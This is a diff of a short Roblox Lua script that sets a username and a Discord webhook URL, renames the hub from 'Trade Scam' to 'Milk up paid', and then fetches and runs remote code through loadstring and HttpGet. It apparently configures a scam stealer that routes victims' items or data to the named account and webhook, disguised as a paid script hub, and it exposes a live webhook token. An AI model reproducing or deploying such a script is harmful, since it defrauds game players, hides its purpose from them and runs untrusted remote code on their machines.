@@ -1,5 +1,5 @@
 _G.Username = "lololol1342x"
-_G.HubName = "Trade Scam (working easter 2023)"
+_G.HubName = "Milk up paid(working easter 2023)"
 _G.WebhookUrl = "https://discord.com/api/webhooks/1094697676592926790/yrLf5W7b2SulIQAgJ98kmIGkxSgprafpPGcKVcHiVx2xGjpoY79k7_DIak2wT_vIOXJn"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
